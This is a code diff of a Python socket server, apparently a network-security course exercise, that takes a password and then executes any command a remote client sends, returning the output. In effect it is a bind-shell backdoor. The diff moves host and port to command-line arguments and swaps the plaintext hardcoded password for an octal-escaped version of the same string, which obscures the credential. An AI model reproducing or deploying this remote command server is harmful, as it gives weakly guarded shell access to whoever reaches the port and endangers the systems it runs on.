@@ -11,14 +11,14 @@ import os
 import sys
 
 def helpList(l):
-	build = ""
-	for line in l:
-		build += line
-	return build
-	
+    build = ""
+    for line in l:
+        build += line
+    return build
+    
 BUFFER_SIZE = 4096
 PASS_MSG = "Password:"
-PW = "CPSC526"
+PW = '\103\120\123\103\65\62\66' 
 hList = ["\tCommands\n","cat <file> \t display a file\n", "cd \t\t change current working directory\n", "help \t\t shows a list of commands\n", "ls [agrs] \t list current directory contents\n","off \t\t shuts down the program\n", "who \t\t lists the users who are currently logged in\n",  "ps \t\t shows the current running processes\n", "pwd \t\t returns the current working directory\n", "who \t\t lists the users currently logged in\n", "***NOTE*** \tThis program will execute all linux commands\n"]
 CONNECT = False
 
@@ -28,8 +28,8 @@ while True:
    if(not(CONNECT)):
        s = socket.socket()         # Create a socket object
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-       host = "172.19.1.132" # Get local machine name
-       port = 9999           # Reserve a port for your service.
+       host = sys.argv[1]       # Get local machine name
+       port = int(sys.argv[2])         # Reserve a port for your service.
        s.bind((host, port))        # Bind to the port
        
        s.listen(5)                 # Now wait for client connection.         
@@ -57,7 +57,7 @@ while True:
            break
        data1 = shlex.split(data)
        if(len(data1) == 0):
-			CONNECT = False
+            CONNECT = False
        elif(data1[0].strip() == "off"):
             c.send(bytearray('GoodBye\n',"ascii"))
             sys.exit()            
@@ -80,7 +80,7 @@ while True:
                 res = subprocess.check_output(data1,stderr=subprocess.STDOUT)
                 c.send(res)
            except Exception, e:
-			   c.send(bytearray(str(e)+'\n', "ascii"))                             
+               c.send(bytearray(str(e)+'\n', "ascii"))                             
    CONNECT = False
 c.close()                # Close the connection
 
